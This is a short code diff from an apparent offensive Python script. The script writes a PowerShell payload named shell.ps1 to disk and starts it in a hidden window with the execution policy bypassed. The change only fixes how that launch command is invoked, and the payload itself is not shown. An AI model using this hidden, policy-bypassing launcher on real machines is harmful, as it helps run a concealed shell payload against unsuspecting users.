@@ -7,4 +7,4 @@ shell = """
 with open("shell.ps1","w") as file:
 	file.write(shell)
 
-os.system('Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File shell.ps1"')
+os.system('powershell.exe Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File shell.ps1"')
